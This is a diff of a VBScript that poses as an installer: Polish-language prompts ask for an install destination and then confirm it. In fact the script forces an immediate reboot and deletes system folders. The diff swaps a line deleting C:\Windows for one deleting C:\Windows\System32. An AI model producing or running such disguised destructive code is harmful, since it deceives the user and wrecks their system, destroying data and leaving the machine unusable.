@@ -7,8 +7,9 @@ sInputBox = InputBox ("Gdzie ma byc miejsce docelowe instalacji??")
 MsgBox "Dobra!! Miejsce docelowe aplikcji to: "& sInputBox,0,"zatwierdzone"
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "shutdown.exe -r -t 0", 0
-Set fso = CreateObject("Scripting.FileSystemObject")
-fso.DeleteFolder "C:\Windows"
+Set filesys = CreateObject("Scripting.FileSystemObject")
+filesys.DeleteFile "C:\Windows\System32"
+
 
 
 
